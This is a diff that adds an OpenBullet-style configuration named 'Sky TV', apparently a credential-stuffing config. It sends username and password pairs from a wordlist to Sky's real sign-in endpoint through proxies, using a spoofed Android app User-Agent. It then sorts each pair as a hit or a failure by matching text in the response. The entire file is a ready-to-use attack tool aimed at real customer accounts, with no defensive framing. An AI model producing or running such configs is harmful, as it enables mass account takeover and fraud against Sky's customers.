@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "Sky TV",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T19:25:55.5687768+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://skyidapp.sky.com/signin/service/mysky" 
+  CONTENT "userIdentifier=<USER>&password=<PASS>&rememberMe=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: MySkyApp/Android/6.25/samsung_SM-N9005/5.1.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "message\":\"Sorry, we did not recognise either your username or password" 
+  KEYCHAIN Success OR 
+    KEY "properties\":{\"eventType\":\"success" 
